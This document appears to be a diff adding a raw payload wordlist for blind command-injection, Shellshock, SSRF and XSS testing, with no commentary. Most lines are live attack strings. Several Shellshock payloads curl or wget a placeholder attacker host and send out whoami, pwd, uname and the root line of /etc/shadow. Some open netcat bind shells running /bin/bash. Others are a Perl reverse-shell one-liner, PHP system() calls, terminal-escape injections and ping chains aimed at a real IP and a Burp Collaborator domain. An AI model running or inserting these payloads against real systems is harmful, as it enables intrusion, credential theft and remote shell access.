@@ -1,0 +1,114 @@
+$(`curl https://domain_collab/.testing/rce_vuln.txt?req=22jjffjbn`)
+$(`wget https://domain_collab/.testing/rce_vuln.txt`)
+$(`wget https://domain_collab/.testing/rce_vuln.txt?req=22jjffjbn`)
+%0a ping -i 30 vps_ip %0a
+%2 -n 21 vps_ip||`ping -c 21 45.77.94.76` #' |ping -n 21 45.77.94.76||`ping -c 21 45.77.94.76` #\" |ping -n 21 45.77.94.76
+() { :;}; /bin/bash -c "curl http://vps_ip/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
+() { :;}; /bin/bash -c "curl http://vps_ip/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
+() { :;}; /bin/bash -c "curl http://vps_ip/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
+() { :;}; /bin/bash -c "curl http://vps_ip/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`"
+() { :;}; /bin/bash -c "curl http://vps_ip/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`"
+() { :;}; /bin/bash -c "curl http://vps_ip/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`"
+() { :;}; /bin/bash -c "curl http://vps_ip/.testing/shellshock.txt?vuln=5"
+() { :;}; /bin/bash -c "sleep 1 && curl http://vps_ip/.testing/shellshock.txt?sleep=1&?vuln=6"
+() { :;}; /bin/bash -c "sleep 1 && echo vulnerable 1"
+() { :;}; /bin/bash -c "sleep 3 && curl http://vps_ip/.testing/shellshock.txt?sleep=3&?vuln=7"
+() { :;}; /bin/bash -c "sleep 3 && echo vulnerable 3"
+() { :;}; /bin/bash -c "sleep 6 && curl http://vps_ip/.testing/shellshock.txt?sleep=6&?vuln=8"
+() { :;}; /bin/bash -c "sleep 6 && curl http://vps_ip/.testing/shellshock.txt?sleep=9&?vuln=9"
+() { :;}; /bin/bash -c "sleep 6 && echo vulnerable 6"
+() { :;}; /bin/bash -c "wget http://vps_ip/.testing/shellshock.txt?vuln=17?user=\`whoami\`"
+() { :;}; /bin/bash -c "wget http://vps_ip/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`"
+() { :;}; /bin/bash -c "wget http://vps_ip/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`"
+() { :;}; /bin/bash -c "wget http://vps_ip/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`"
+() { :;}; /bin/bash -c "wget http://vps_ip/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`"
+() { :;}; /bin/bash -c "wget http://vps_ip/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`"
+() { :;}; /bin/bash -c "wget http://vps_ip/.testing/shellshock.txt?vuln=4"
+& curl http://domain_collab/.testing/rce.txt
+| curl http://domain_collab/.testing/rce.txt
+&& curl https://domain_collab/.testing/rce_vuln.txt
+; curl https://domain_collab/.testing/rce_vuln.txt
+curl https://domain_collab/.testing/rce_vuln.txt
+ curl https://domain_collab/.testing/rce_vuln.txt ||`curl https://h0i049bs86zjfshjhgja89l4mvsngc.burpcollaborator.net/.testing/rce_vuln.txt` #' |curl https://h0i049bs86zjfshjhgja89l4mvsngc.burpcollaborator.net/.testing/rce_vuln.txt||`curl https://h0i049bs86zjfshjhgja89l4mvsngc.burpcollaborator.net/.testing/rce_vuln.txt` #\" |curl https://h0i049bs86zjfshjhgja89l4mvsngc.burpcollaborator.net/.testing/rce_vuln.txt
+curl https://domain_collab/.testing/rce_vuln.txt ||`curl https://h0i049bs86zjfshjhgja89l4mvsngc.burpcollaborator.net/.testing/rce_vuln.txt` #' |curl https://h0i049bs86zjfshjhgja89l4mvsngc.burpcollaborator.net/.testing/rce_vuln.txt||`curl https://h0i049bs86zjfshjhgja89l4mvsngc.burpcollaborator.net/.testing/rce_vuln.txt` #\" |curl https://h0i049bs86zjfshjhgja89l4mvsngc.burpcollaborator.net/.testing/rce_vuln.txt
+() { :;}; curl http://vps_ip/.testing/shellshock.txt?vuln=12
+data://domain_collab
+data://vps_ip
+dict://domain_collab
+dict://vps_ip
+//domain_collab
+\\domain_collab
+domain_collab
+\\domain_collab\C$
+echo '<img src=https://domain_collab/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
+echo '<script src=https://domain_collab/.testing/xss.js></script>'// XXXXXXXXXXX
+& echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > domain_collab
+&& echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > domain_collab
+; echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > domain_collab
+| echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > domain_collab
+echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > domain_collab
+expect://domain_collab
+expect://vps_ip
+file://domain_collab
+file://vps_ip
+ftp://domain_collab
+ftp://vps_ip
+glob://domain_collab
+glob://vps_ip
+gopher://domain_collab
+gopher://vps_ip
+http://domain_collab
+https://domain_collab
+https://vps_ip
+http://vps_ip
+mailto://domain_collab
+mailto://vps_ip
+\n\033[2curl http://vps_ip/.testing/term_escape.txt?vuln=1?user=\`whoami\`
+\n\033[2wget http://vps_ip/.testing/term_escape.txt?vuln=2?user=\`whoami\`
+\necho INJECTX\nexit\n\033[2Acurl https://domain_collab/.testing/rce_vuln.txt\n
+\necho INJECTX\nexit\n\033[2Awget https://domain_collab/.testing/rce_vuln.txt\n
+ogg://domain_collab
+ogg://vps_ip
+phar://domain_collab
+phar://vps_ip
+<?php system("curl https://domain_collab/.testing/rce_vuln.txt?method=phpsystem_get");?>
+<?php system("curl https://domain_collab/.testing/rce_vuln.txt?req=df2fkjj");?>
+<?php system("wget https://domain_collab/.testing/rce_vuln.txt?method=phpsystem_get");?>
+<?php system("wget https://domain_collab/.testing/rce_vuln.txt?retepq=jdfj2jc");?>
+& ping -i 30 vps_ip &
+& ping -n 30 vps_ip &
+`ping vps_ip`
+rar://domain_collab
+rar://vps_ip
+ssh2://domain_collab
+ssh2://vps_ip
+###SSRF
+& system('curl https://domain_collab/.testing/rce_vuln.txt');
+&& system('curl https://domain_collab/.testing/rce_vuln.txt');
+; system('curl https://domain_collab/.testing/rce_vuln.txt');
+| system('curl https://domain_collab/.testing/rce_vuln.txt');
+|| system('curl https://domain_collab/.testing/rce_vuln.txt');
+system('curl https://domain_collab/.testing/rce_vuln.txt')
+system('curl https://domain_collab/.testing/rce_vuln.txt');
+system('curl https://domain_collab/.testing/rce_vuln.txt?req=22fd2wdf')
+system('wget https://domain_collab/.testing/rce_vuln.txt');
+system('wget https://domain_collab/.testing/rce_vuln.txt?req=22fd2w23')
+telnet://domain_collab
+telnet://vps_ip
+tftp://domain_collab
+tftp://vps_ip
+() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://vps_ip/.testing/shellshock.txt?vuln=13;curl http://45.77.94.76/.testing/shellshock.txt?vuln=15;\");'
+//vps_ip
+\\vps_ip
+vps_ip
+\\vps_ip\C$
+& wget http://domain_collab/.testing/rce.txt
+| wget http://domain_collab/.testing/rce.txt
+&& wget https://domain_collab/.testing/rce_vuln.txt
+; wget https://domain_collab/.testing/rce_vuln.txt
+wget https://domain_collab/.testing/rce_vuln.txt
+() { :;}; wget http://vps_ip/.testing/shellshock.txt?vuln=11
+zip://domain_collab
+zip://vps_ip
+zlib://domain_collab
+zlib://vps_ip
